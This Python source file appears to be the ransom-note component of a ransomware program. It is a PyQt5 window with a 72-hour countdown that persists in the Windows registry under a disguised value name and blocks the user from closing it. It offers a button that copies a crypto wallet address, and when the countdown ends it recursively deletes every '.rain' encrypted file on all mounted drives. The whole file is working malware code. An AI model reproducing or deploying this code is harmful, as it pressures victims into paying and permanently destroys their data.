from design import Ui_MW_Counter
from PyQt5.QtWidgets import QMainWindow, QAction
from datetime import timedelta
from PyQt5.QtCore import QTimer
from clipboard import copy
from winreg import *
from os import remove
from glob import iglob
from util import drivers


class Counter(QMainWindow, Ui_MW_Counter):
    """
    Class containing the interface, inherited from the "design.py" file and its own methods.
    The design was created using QtDesigner and can be found in the "files" directory of this
    repository.
    """
    def __init__(self, parent=None, countdown=259200) -> None:
        """
        During the initialization of the instance, it is checked if the machine in question is
        already infected through the key created in the Windows registry. If there is no saved
        "elapsed time", counting starts as standard (72 hours).

        Parameters
        ----------
        parent: None
            Related to the QMainWindow class
        countdown: int
            The time remaining until the encrypted files are deleted

        Return
        ----------
        None
        """
        super().__init__(parent)
        super().setupUi(self)
        state = self.__check_state()

        if state:
            self.countdown = state
        else:
            self.countdown = countdown

        quit_deny = QAction("Quit", self)
        quit_deny.triggered.connect(self.closeEvent)

        self.BTN_Copy.clicked.connect(self.__copy)

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.__counting)
        self.timer.start(1000)

    def __counting(self) -> None:
        """
        Method responsible for constantly updating the Label of the remaining time in the
        interface. Each call also runs the private method "save_state", which saves the current
        state of the count in the Windows registry. If "countdown" is decreased to -1 (end of count),
        the key in the registry is deleted and the static method "delete_all" is called.

        Return
        ----------
        None
        """
        if self.countdown >= 0:
            remaining = timedelta(seconds=self.countdown)
            seconds = remaining.total_seconds()

            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            seconds = seconds % 60

            remaining = f'{int(hours)}:{int(minutes)}:{int(seconds)}'

            self.LBL_Counter.setText(remaining)
            self.countdown = self.countdown - 1
            self.__save_state()
        else:
            key = CreateKey(HKEY_LOCAL_MACHINE, '')

            try:
                DeleteValue(key, 'WINDAT32_HOURS')
                CloseKey(key)
            except PermissionError:
                key = CreateKey(HKEY_CURRENT_USER, '')
                DeleteValue(key, 'WINDAT32_HOURS')
                CloseKey(key)

            self.close()
            self.delete_all(drivers)
            
    def __save_state(self) -> None:
        """
        Method executed every second that counts. Create a key in "HKEY_LOCAL_MACHINE" and try to
        save the remaining seconds. If an exception of the "Permission Error" type occurs, create the
        key in "HKEY_CURRENT_USER" and continue the process.

        Return
        ----------
        None
        """
        key = CreateKey(HKEY_LOCAL_MACHINE, '')

        try:
            SetValueEx(key, 'WINDAT32_HOURS', 0, REG_SZ, str(self.countdown))
            CloseKey(key)
        except PermissionError:
            key = CreateKey(HKEY_CURRENT_USER, '')
            SetValueEx(key, 'WINDAT32_HOURS', 0, REG_SZ, str(self.countdown))
            CloseKey(key)

    def __check_state(self) -> (None, int):
        """
        Method executed at instance startup. Try to find the key containing the remaining seconds
        in "HKEY_LOCAL_MACHINE". If there are exceptions of the types "PermissionError" or
        "FileNotFoundError", try to find it in "HKEY_CURRENT_USER". If the key does not exist,
        it returns None.

        Return
        ----------
        None
            If the remaining time is not found
        int
            If the remaining time is found
        """
        key = CreateKey(HKEY_LOCAL_MACHINE, '')

        try:
            state = QueryValueEx(key, 'WINDAT32_HOURS')[0]
            CloseKey(key)
        except (PermissionError, FileNotFoundError):
            try:
                key = CreateKey(HKEY_CURRENT_USER, '')
                state = QueryValueEx(key, 'WINDAT32_HOURS')[0]
                CloseKey(key)
            except FileNotFoundError:
                return None

        return int(state)

    def __copy(self) -> None:
        """
        Copy the address of the virtual wallet to the clipboard of the machine.
        Called when "BTN_Copy" captures a click event.

        Return
        ----------
        None
        """
        copy(self.LE_Wallet.text())

    def closeEvent(self, event) -> None:
        """
        Ignore incoming events. Called when the user tries to close the interface window in a
        conventional manner (by clicking the "X").

        Parameters
        ----------
        event: None
            Related to the QMainWindow class

        Return
        ----------
        None
        """
        event.ignore()

    @staticmethod
    def delete_all(drivers: list) -> None:
        """
        Removes all files with the "rain" extension from the machine and possible drivers mounted
        using the "iglob" generator.

        Parameters
        ----------
        drivers: list
            List of possible drivers mounted on the machine

        Return
        ----------
        None
        """
        for driver in drivers:
            files = iglob(driver + '/**/*.rain', recursive=True)
            
            for file in files:
                remove(file)
